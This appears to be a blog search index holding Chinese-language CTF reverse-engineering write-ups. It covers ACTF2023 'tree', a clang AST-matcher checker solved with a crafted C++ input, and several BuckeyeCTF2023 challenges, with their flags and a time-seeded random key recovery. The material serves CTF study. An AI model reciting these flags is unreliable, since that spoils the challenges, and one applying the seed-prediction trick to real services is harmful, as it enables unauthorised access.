<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACTF2023</title>
    <url>/2023/11/08/ACTF2023/</url>
    <content><![CDATA[<h6 id="preface强度巨高在打但是赛中算没出题hhhh5555555复盘以及复现一下"><a class="markdownIt-Anchor" href="#preface强度巨高在打但是赛中算没出题hhhh5555555复盘以及复现一下">#</a> PREFACE：强度巨高在打，但是赛中算没出题 hhhh5555555，复盘以及复现一下</h6>
<span id="more"></span>
<h3 id="tree"><a class="markdownIt-Anchor" href="#tree">#</a> tree</h3>
<h6 id="赛中最接近出的题"><a class="markdownIt-Anchor" href="#赛中最接近出的题">#</a> 赛中最接近出的题</h6>
<p>直接打开看行为可以发现它不解析 <code>#include</code>  头文件，会给你编译一个 cpp 代码</p>
<p>初步观察可以看到三个 check，全过可以从 server 返回 flag</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031083726042.png" alt="image-20231031083726042"></p>
<p>查找字符串，一开始以为是模仿的 gcc 编译器，但是问学长说不像（这里就缺乏经验了已经，问的时候学长就说先看是啥的编译器，自己调了很久也没有去想）字符串发现是 clang</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031083617728.png" alt="image-20231031083617728"></p>
<p>源码非常复杂，而且有很多 handler 的结构，导致函数调用往往是跳转表，这里一定得恢复符号（后面 check3 不恢复符号几乎没办法分析，相反能恢复符号就好做）</p>
<p>check1 有一个  <code>== 25</code> ，这里其实很容易测试，这里会计算符号的优先级，直接从最高等级的 <code>* /</code>  视到低等级的比较条件运算符，等级越低数字越大，然后就测到  <code>+= 1</code>  可以让 check1 + 1，其它会减一，所以最后的结构里面  <code>+= 1</code>  比其它的多一即可</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031083839468.png" alt="image-20231031083839468"></p>
<p>其实是这个</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031084453947.png" alt="image-20231031084453947"></p>
<p>然后有这个函数（这里已经恢复了符号表）：</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031084427849.png" alt="image-20231031084427849"></p>
<p>这里会捕捉一个名为 <code>AAA</code>  的 class</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031084514268.png" alt="image-20231031084514268"></p>
<p>我们要让我们的结构通过这里的 check：</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031084749639.png" alt="image-20231031084749639"></p>
<p>（这部分都是当时猜的，然后也没有去恢复符号表了）</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085122412.png" alt="image-20231031085122412"></p>
<p>然后多虚函数继承就过了这里的 check2</p>
<p>下午四点就过了 check2，本以为形势一片大好，结果游戏才刚刚开始，check3 做到早上四点，没救</p>
<p>小折腾了一下，直接搞了个 clang15.0.4 给 bindiff 进去，但这里当时是看不到的，而且直观上会往这里面看</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085452353.png" alt="image-20231031085452353"></p>
<p>总之这里一直边调边猜（现在看看这个凌晨两点的记录有些消愁了，但是确实调了几个小时没进展，各种玩意也在反复试）</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085542600.png" alt="image-20231031085542600"></p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085710771.png" alt="image-20231031085710771"></p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085647733.png" alt="image-20231031085647733"></p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031085814563.png" alt="image-20231031085814563"></p>
<p>晚上的时候放出 hint：需要看一下 <code>ast_matcher</code>  相关，然后我们一直在找已有的符号以及字符串</p>
<p>不料其实不是这样，应该自己搞一个 <code>ast_matcher</code>  的 api 调用，再 bindiff 进去，就好看了</p>
<p>这部分已经是赛后做的了（小问了一下出题人）</p>
<p>自己把 clang 安了，然后编译一个这个（这个会匹配 <code>for(int i=1;i&lt;2;i++)&#123;&#125;</code> ）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;clang/Tooling/Tooling.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> clang;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> clang::ast_matchers;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> clang::tooling;</span><br><span class="line"><span class="type">static</span> llvm::<span class="function">cl::OptionCategory <span class="title">MyToolCategory</span><span class="params">(<span class="string">&quot;my-tool options&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoopPrinter</span> : <span class="keyword">public</span> MatchFinder::MatchCallback &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">run</span><span class="params">(<span class="type">const</span> MatchFinder::MatchResult &amp;Result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="type">const</span> ForStmt *FS = Result.Nodes.<span class="built_in">getNodeAs</span>&lt;clang::ForStmt&gt;(<span class="string">&quot;forLoop&quot;</span>)) &#123;</span><br><span class="line">            FS-&gt;<span class="built_in">dump</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ExpectedParser = CommonOptionsParser::<span class="built_in">create</span>(argc, argv, MyToolCategory);</span><br><span class="line">    <span class="keyword">if</span> (!ExpectedParser) &#123;</span><br><span class="line">        llvm::<span class="built_in">errs</span>() &lt;&lt; ExpectedParser.<span class="built_in">takeError</span>(); <span class="comment">// Print any errors.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CommonOptionsParser&amp; OptionsParser = ExpectedParser.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        llvm::<span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;C++ source file&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> Matcher =</span><br><span class="line">        forStmt(</span><br><span class="line">            <span class="built_in">hasLoopInit</span>(<span class="built_in">declStmt</span>(</span><br><span class="line">                <span class="built_in">hasSingleDecl</span>(<span class="built_in">varDecl</span>(</span><br><span class="line">                    <span class="built_in">hasInitializer</span>(<span class="built_in">integerLiteral</span>(<span class="built_in">equals</span>(<span class="number">1</span>)))</span><br><span class="line">                ))</span><br><span class="line">            )),</span><br><span class="line">            <span class="built_in">hasCondition</span>(<span class="built_in">binaryOperator</span>(</span><br><span class="line">                <span class="built_in">hasOperatorName</span>(<span class="string">&quot;&lt;&quot;</span>),</span><br><span class="line">                <span class="built_in">hasLHS</span>(<span class="built_in">ignoringParenImpCasts</span>(<span class="built_in">declRefExpr</span>(</span><br><span class="line">                    <span class="built_in">to</span>(<span class="built_in">varDecl</span>(<span class="built_in">hasType</span>(<span class="built_in">isInteger</span>())))</span><br><span class="line">                ))),</span><br><span class="line">                <span class="built_in">hasRHS</span>(<span class="built_in">integerLiteral</span>(<span class="built_in">equals</span>(<span class="number">2</span>)))</span><br><span class="line">            )),</span><br><span class="line">            <span class="built_in">hasIncrement</span>(<span class="built_in">unaryOperator</span>(</span><br><span class="line">                <span class="built_in">hasOperatorName</span>(<span class="string">&quot;++&quot;</span>),</span><br><span class="line">                <span class="built_in">hasUnaryOperand</span>(<span class="built_in">ignoringParenImpCasts</span>(<span class="built_in">declRefExpr</span>(</span><br><span class="line">                    <span class="built_in">to</span>(<span class="built_in">varDecl</span>(<span class="built_in">hasType</span>(<span class="built_in">isInteger</span>())))</span><br><span class="line">                )))</span><br><span class="line">            ))</span><br><span class="line">        ).<span class="built_in">bind</span>(<span class="string">&quot;forloop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    LoopPrinter Printer;</span><br><span class="line">    MatchFinder Finder;</span><br><span class="line">    Finder.<span class="built_in">addMatcher</span>(Matcher, &amp;Printer);</span><br><span class="line">    <span class="function">ClangTool <span class="title">Tool</span><span class="params">(OptionsParser.getCompilations(), OptionsParser.getSourcePathList())</span></span>;</span><br><span class="line">    <span class="keyword">return</span> Tool.<span class="built_in">run</span>(<span class="built_in">newFrontendActionFactory</span>(&amp;Finder).<span class="built_in">get</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang++ -g test_tree.cpp -o loop_printer -I/usr/lib/llvm-14/include -L/usr/lib/llvm-14/lib -lclangTooling -lclangASTMatchers -lclangFrontend -lclangSerialization -lclangDriver -lclangParse -lclangSema -lclangAnalysis -lclangEdit -lclangAST -lclangLex -lclangBasic -lLLVM-14 -std=c++14 -pthread -ldl</span></span><br></pre></td></tr></table></figure>
<p>然后 bindiff 进去，结果：</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031090305967.png" alt="image-20231031090305967"></p>
<p>对照自己编译出来的 loop_printer，就好搞多了</p>
<p><code>&lt;</code>  和 <code>++</code>  的匹配点比较明显</p>
<p>这里一开始一直找不到比较的数字，然后发现会写在栈上：</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031090457603.png" alt="image-20231031090457603"></p>
<p>前面的 <code>++</code>  和 <code>&lt;</code>  比较容易识别，就是这里的数字有点难找，然后注意这里的 &quot;1&quot; 和 &quot;2&quot; 和 &quot;f&quot; 是一样的，只是一个符号，相当于</p>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031090609600.png" alt="image-20231031090609600"> 没有实际意义</p>
<p>匹配上 check3 以后，把 check3=5 构造一下，把 check1 抵消一下，得到最后的 payload：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">d</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">AAA</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> d&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> d&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> AAA&#123;</span><br><span class="line">    <span class="keyword">namespace</span> AAA&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">AAA</span>: <span class="keyword">virtual</span> <span class="keyword">public</span> b, <span class="keyword">virtual</span> <span class="keyword">public</span> c&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="built_in">AAA</span>() &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span> ;a &lt; <span class="number">10</span>; a++)&#123;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">2</span> ;a &lt; <span class="number">10</span>; a++)&#123;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span> ;a &lt; <span class="number">10</span>; a++)&#123;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span> ;a &lt; <span class="number">10</span>; a++)&#123;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span> ;a &lt; <span class="number">10</span>; a++)&#123;</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="../../../hexo1/source/_posts/ACTF2023/image-20231031090731200.png" alt="image-20231031090731200"></p>
<p>发给服务器远程也是可以通的（没截图），没问题了</p>
<p>这题有一个很麻烦的点，第三个 check 必须恢复符号表，否则<strong>根本看不出来它是匹配的符号还是自定义的符号名</strong>，前两个 check 中间过程比较清晰，好猜些，第三个的中间比对过程相当难看与抽象，甚至最后一个数字我还找了好一会</p>
<h3 id="obfuse"><a class="markdownIt-Anchor" href="#obfuse">#</a> Obfuse</h3>
]]></content>
  </entry>
  <entry>
    <title>ACTF flutter复现</title>
    <url>/2024/03/28/ACTF-flutter%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h6 id="rpeface写一个flutter程序以后自己逆逆呗一看刚好有个高版本flutter的题没复现~"><a class="markdownIt-Anchor" href="#rpeface写一个flutter程序以后自己逆逆呗一看刚好有个高版本flutter的题没复现~">#</a> RPEFACE：写一个 flutter 程序以后自己逆逆呗，一看刚好有个高版本 flutter 的题没复现～</h6>
<span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>BuckeyeCTF2023</title>
    <url>/2023/10/02/BuckeyeCTF2023/</url>
    <content><![CDATA[<h6 id="preface-和maple一个时间段的比赛似乎是大学新生赛感觉-比maple难呢"><a class="markdownIt-Anchor" href="#preface-和maple一个时间段的比赛似乎是大学新生赛感觉-比maple难呢">#</a> PREFACE: 和 maple 一个时间段的比赛，似乎是大学新生赛… 感觉 比 maple 难呢…</h6>
<h6 id="或者换一种说法怎么大学新生赛都喜欢搞抽象呢"><a class="markdownIt-Anchor" href="#或者换一种说法怎么大学新生赛都喜欢搞抽象呢">#</a> 或者换一种说法… 怎么大学新生赛都喜欢搞抽象呢…</h6>
<span id="more"></span>
<h3 id="8ball"><a class="markdownIt-Anchor" href="#8ball">#</a> 8ball</h3>
<p>直接动调把前面全 nop 掉拿就行： <code>bctf&#123;Aw_$hucK$_Y0ur3_m@k1Ng_m3_bLu$h&#125;</code></p>
<h3 id="converter"><a class="markdownIt-Anchor" href="#converter">#</a> Converter</h3>
<p>就在里面： <code>bctf&#123;o0ps_y0u_fOuNd_mE&#125;</code></p>
<h3 id="emotional_damage"><a class="markdownIt-Anchor" href="#emotional_damage">#</a> Emotional_Damage</h3>
<p>确实给我 damage 了，总归就是猜 emoji 代表的符号然后恢复流程逆 flag，大部分可以 gpt 一把梭</p>
<h3 id="skribl"><a class="markdownIt-Anchor" href="#skribl">#</a> Skribl</h3>
<p>需要配置 docker 环境把 python313 环境搞出来，拿到 backend 字节码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># backend.pyc</span></span><br><span class="line"></span><br><span class="line"> <span class="number">0</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">1</span>           <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">              <span class="number">6</span> IMPORT_NAME              <span class="number">0</span> (string)</span><br><span class="line">              <span class="number">8</span> STORE_NAME               <span class="number">0</span> (string)</span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>          <span class="number">10</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">14</span> IMPORT_NAME              <span class="number">1</span> (random)</span><br><span class="line">             <span class="number">16</span> STORE_NAME               <span class="number">1</span> (random)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>          <span class="number">18</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">20</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">22</span> IMPORT_NAME              <span class="number">2</span> (time)</span><br><span class="line">             <span class="number">24</span> STORE_NAME               <span class="number">2</span> (time)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">26</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">28</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">30</span> IMPORT_NAME              <span class="number">3</span> (math)</span><br><span class="line">             <span class="number">32</span> STORE_NAME               <span class="number">3</span> (math)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">34</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">38</span> IMPORT_NAME              <span class="number">4</span> (os)</span><br><span class="line">             <span class="number">40</span> STORE_NAME               <span class="number">4</span> (os)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">42</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;return&#x27;</span>)</span><br><span class="line">             <span class="number">44</span> LOAD_NAME                <span class="number">5</span> (<span class="built_in">str</span>)</span><br><span class="line">             <span class="number">46</span> BUILD_TUPLE              <span class="number">2</span></span><br><span class="line">             <span class="number">48</span> LOAD_CONST               <span class="number">3</span> (&lt;code <span class="built_in">object</span> create_skribl at <span class="number">0x7f763b846970</span>, file <span class="string">&quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;</span>, line <span class="number">8</span>&gt;)</span><br><span class="line">             <span class="number">50</span> MAKE_FUNCTION</span><br><span class="line">             <span class="number">52</span> SET_FUNCTION_ATTRIBUTE   <span class="number">4</span> (annotations)</span><br><span class="line">             <span class="number">54</span> STORE_NAME               <span class="number">6</span> (create_skribl)</span><br><span class="line"></span><br><span class="line"> <span class="number">18</span>          <span class="number">56</span> LOAD_CONST               <span class="number">4</span> (&lt;code <span class="built_in">object</span> init_backend at <span class="number">0x7f763b734670</span>, file <span class="string">&quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;</span>, line <span class="number">18</span>&gt;)</span><br><span class="line">             <span class="number">58</span> MAKE_FUNCTION</span><br><span class="line">             <span class="number">60</span> STORE_NAME               <span class="number">7</span> (init_backend)</span><br><span class="line">             <span class="number">62</span> RETURN_CONST             <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> create_skribl at <span class="number">0x7f763b846970</span>, file <span class="string">&quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;</span>, line <span class="number">8</span>&gt;:</span><br><span class="line">   <span class="number">8</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">9</span>           <span class="number">2</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">print</span> + NULL)</span><br><span class="line">              <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;Creating skribl &#x27;</span>)</span><br><span class="line">              <span class="number">14</span> LOAD_FAST                <span class="number">1</span> (message)</span><br><span class="line">              <span class="number">16</span> FORMAT_SIMPLE</span><br><span class="line">              <span class="number">18</span> BUILD_STRING             <span class="number">2</span></span><br><span class="line">              <span class="number">20</span> CALL                     <span class="number">1</span></span><br><span class="line">              <span class="number">28</span> POP_TOP</span><br><span class="line"></span><br><span class="line">  <span class="number">11</span>          <span class="number">30</span> LOAD_GLOBAL              <span class="number">2</span> (string)</span><br><span class="line">              <span class="number">40</span> LOAD_ATTR                <span class="number">4</span> (ascii_lowercase)</span><br><span class="line">              <span class="number">60</span> LOAD_GLOBAL              <span class="number">2</span> (string)</span><br><span class="line">              <span class="number">70</span> LOAD_ATTR                <span class="number">6</span> (ascii_uppercase)</span><br><span class="line">              <span class="number">90</span> BINARY_OP                <span class="number">0</span> (+)</span><br><span class="line">              <span class="number">94</span> LOAD_GLOBAL              <span class="number">2</span> (string)</span><br><span class="line">             <span class="number">104</span> LOAD_ATTR                <span class="number">8</span> (digits)</span><br><span class="line">             <span class="number">124</span> BINARY_OP                <span class="number">0</span> (+)</span><br><span class="line">             <span class="number">128</span> STORE_FAST               <span class="number">3</span> (alphabet)</span><br><span class="line"></span><br><span class="line">  <span class="number">12</span>         <span class="number">130</span> LOAD_GLOBAL             <span class="number">11</span> (<span class="built_in">range</span> + NULL)</span><br><span class="line">             <span class="number">140</span> LOAD_CONST               <span class="number">2</span> (<span class="number">40</span>)</span><br><span class="line">             <span class="number">142</span> CALL                     <span class="number">1</span></span><br><span class="line">             <span class="number">150</span> GET_ITER</span><br><span class="line">             <span class="number">152</span> LOAD_FAST_AND_CLEAR      <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">154</span> SWAP                     <span class="number">2</span></span><br><span class="line">             <span class="number">156</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">158</span> SWAP                     <span class="number">2</span></span><br><span class="line">         &gt;&gt;  <span class="number">160</span> FOR_ITER                <span class="number">25</span> (to <span class="number">214</span>)</span><br><span class="line">             <span class="number">164</span> STORE_FAST               <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">166</span> LOAD_GLOBAL             <span class="number">12</span> (random)</span><br><span class="line">             <span class="number">176</span> LOAD_ATTR               <span class="number">14</span> (choice)</span><br><span class="line">             <span class="number">196</span> PUSH_NULL</span><br><span class="line">             <span class="number">198</span> LOAD_FAST                <span class="number">3</span> (alphabet)</span><br><span class="line">             <span class="number">200</span> CALL                     <span class="number">1</span></span><br><span class="line">             <span class="number">208</span> LIST_APPEND              <span class="number">2</span></span><br><span class="line">             <span class="number">210</span> JUMP_BACKWARD           <span class="number">27</span> (to <span class="number">160</span>)</span><br><span class="line">         &gt;&gt;  <span class="number">214</span> END_FOR</span><br><span class="line">             <span class="number">216</span> STORE_FAST               <span class="number">5</span> (key_list)</span><br><span class="line">             <span class="number">218</span> STORE_FAST               <span class="number">4</span> (i)</span><br><span class="line"></span><br><span class="line">  <span class="number">14</span>         <span class="number">220</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">             <span class="number">222</span> LOAD_ATTR               <span class="number">17</span> (join + NULL|self)</span><br><span class="line">             <span class="number">242</span> LOAD_FAST                <span class="number">5</span> (key_list)</span><br><span class="line">             <span class="number">244</span> CALL                     <span class="number">1</span></span><br><span class="line">             <span class="number">252</span> STORE_FAST               <span class="number">6</span> (key)</span><br><span class="line"></span><br><span class="line">  <span class="number">15</span>         <span class="number">254</span> LOAD_FAST_LOAD_FAST     <span class="number">18</span> (message, author)</span><br><span class="line">             <span class="number">256</span> BUILD_TUPLE              <span class="number">2</span></span><br><span class="line">             <span class="number">258</span> LOAD_FAST_LOAD_FAST      <span class="number">6</span> (skribls, key)</span><br><span class="line">             <span class="number">260</span> STORE_SUBSCR</span><br><span class="line"></span><br><span class="line">  <span class="number">16</span>         <span class="number">264</span> LOAD_FAST                <span class="number">6</span> (key)</span><br><span class="line">             <span class="number">266</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="literal">None</span>     &gt;&gt;  <span class="number">268</span> SWAP                     <span class="number">2</span></span><br><span class="line">             <span class="number">270</span> POP_TOP</span><br><span class="line"></span><br><span class="line">  <span class="number">12</span>         <span class="number">272</span> SWAP                     <span class="number">2</span></span><br><span class="line">             <span class="number">274</span> STORE_FAST               <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">276</span> RERAISE                  <span class="number">0</span></span><br><span class="line">ExceptionTable:</span><br><span class="line">  <span class="number">156</span> to <span class="number">214</span> -&gt; <span class="number">268</span> [<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> init_backend at <span class="number">0x7f763b734670</span>, file <span class="string">&quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;</span>, line <span class="number">18</span>&gt;:</span><br><span class="line"> <span class="number">18</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> <span class="number">19</span>           <span class="number">2</span> LOAD_GLOBAL              <span class="number">0</span> (random)</span><br><span class="line">             <span class="number">12</span> LOAD_ATTR                <span class="number">2</span> (seed)</span><br><span class="line">             <span class="number">32</span> PUSH_NULL</span><br><span class="line">             <span class="number">34</span> LOAD_GLOBAL              <span class="number">4</span> (math)</span><br><span class="line">             <span class="number">44</span> LOAD_ATTR                <span class="number">6</span> (floor)</span><br><span class="line">             <span class="number">64</span> PUSH_NULL</span><br><span class="line">             <span class="number">66</span> LOAD_GLOBAL              <span class="number">8</span> (time)</span><br><span class="line">             <span class="number">76</span> LOAD_ATTR                <span class="number">8</span> (time)</span><br><span class="line">             <span class="number">96</span> PUSH_NULL</span><br><span class="line">             <span class="number">98</span> CALL                     <span class="number">0</span></span><br><span class="line">            <span class="number">106</span> CALL                     <span class="number">1</span></span><br><span class="line">            <span class="number">114</span> CALL                     <span class="number">1</span></span><br><span class="line">            <span class="number">122</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">21</span>         <span class="number">124</span> LOAD_GLOBAL             <span class="number">11</span> (create_skribl + NULL)</span><br><span class="line">            <span class="number">134</span> LOAD_FAST                <span class="number">0</span> (skribls)</span><br><span class="line">            <span class="number">136</span> LOAD_GLOBAL             <span class="number">12</span> (os)</span><br><span class="line">            <span class="number">146</span> LOAD_ATTR               <span class="number">14</span> (environ)</span><br><span class="line">            <span class="number">166</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">            <span class="number">168</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">172</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;rene&#x27;</span>)</span><br><span class="line">            <span class="number">174</span> CALL                     <span class="number">3</span></span><br><span class="line">            <span class="number">182</span> POP_TOP</span><br><span class="line">            <span class="number">184</span> RETURN_CONST             <span class="number">0</span> (<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>这里的字节码简单手动反编译一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_skribl</span>(<span class="params">skribls, message, author</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">f&#x27;Creating skribl <span class="subst">&#123;message&#125;</span>&#x27;</span>)</span><br><span class="line">    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    key_list = [random.choice(alphabet) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span>.join(key_list)</span><br><span class="line">    skribls[key] = (message, author)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_backend</span>(<span class="params">skribls</span>):</span><br><span class="line">    random.seed(math.floor(time.time()))</span><br><span class="line">    create_skribl(skribls, os.environ[<span class="string">&#x27;FLAG&#x27;</span>], <span class="string">&#x27;rene&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结合前面的代码，可以看到生成的四十个随机串有一个 seed，是可以获取的（当前时间 - 网页持续时间，可以拿到这个环境的创建时间，flag 是环境创建后立刻从环境变量中提取并写入的，所以可以直接获得 key）</p>
<p>使用 key 访问 view api 即可</p>
